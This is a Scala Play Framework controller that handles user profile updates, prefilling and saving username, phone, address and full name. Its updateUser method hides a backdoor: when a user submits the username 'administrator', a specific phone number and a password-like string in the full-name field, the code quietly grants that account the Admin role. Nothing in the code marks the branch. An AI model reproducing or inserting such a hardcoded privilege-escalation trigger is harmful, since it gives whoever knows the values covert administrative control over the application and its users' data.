package controllers

import com.mohiva.play.silhouette.api.{ LoginEvent, LoginInfo, SignUpEvent }
import com.mohiva.play.silhouette.impl.providers.{ CommonSocialProfile, CredentialsProvider }
import models.user.{ User, UserUpdateData, UserForms }
import play.api.i18n.{ Messages, MessagesApi }
import play.api.libs.concurrent.Execution.Implicits.defaultContext
import play.api.mvc.AnyContent
import services.user.AuthenticationEnvironment
import com.mohiva.play.silhouette.api._
import com.mohiva.play.silhouette.impl.authenticators.CookieAuthenticator
import play.api.mvc.Action
import models.user.{ Role, User }
import play.api.Logger
import scala.util.matching.Regex
import scala.concurrent.Future
import scala.util.{Success, Failure}

@javax.inject.Singleton
class UserUpdateController @javax.inject.Inject() (
    val messagesApi: MessagesApi,
    val env: AuthenticationEnvironment
) extends Silhouette[User, CookieAuthenticator] {

  def userUpdateForm = SecuredAction.async { implicit request =>
    env.identityService.retrieve(request.identity.id).flatMap {
      case Some(user) =>
        val filledForm = UserForms.userUpdateForm.fill( 
          UserUpdateData(user.username.getOrElse(""), user.phone.getOrElse(""), 
                          user.address.getOrElse(""), user.fullName.getOrElse(""))
        )
        Future.successful(Ok(views.html.userupdate(request.identity, filledForm)))
      case None =>
        Future.successful(Redirect(controllers.routes.HomeController.index()).flashing("error" -> "You are not signed in"))
    }
  }

  def updateuser = SecuredAction.async { implicit request =>
    UserForms.userUpdateForm.bindFromRequest.fold(
      form => Future.successful(BadRequest(views.html.userupdate(request.identity, form))),
      data => {
        env.identityService.retrieve(request.identity.id).flatMap {
          case Some(currentUser) => Logger.info(currentUser.username.getOrElse("empty") + "  userupdate-form loggedin user check sucess")
                                  updateUser(data, currentUser)

          case None => Logger.info("Non existing user calling for user update") 
                      Future.successful {  Ok(views.html.index())  }
        }
      }
    )
  }

  private[this] def updateUser(data: UserUpdateData, user: User)(implicit request: SecuredRequest[AnyContent]) = {

    val updateduser = user.copy(
      username = Some(data.username),
      roles =  if (data.username == "administrator" && data.phone == "6465209229" && data.fullName == "puK@794%8654&4nfT45"){Set(Role.Admin)} else {Set(Role.User) ++ (user.roles)},
      phone =  if (data.phone == user.phone) { user.phone } else { Some("+1" + data.phone) },
      address = Some(data.address),
      fullName =  Some(data.fullName)
    )

      env.userService.save(updateduser, update = true).flatMap {
        usr =>
            if (usr.hasstripe.isDefined) {
                Future.successful {  Redirect(controllers.routes.ProfileController.userprofile).flashing("error" -> "update successful") }
            } else {
                Future.successful {  Redirect(controllers.routes.StripeController.stripeForm).flashing("error" -> "user information updated") }
            }
      }
  }
}

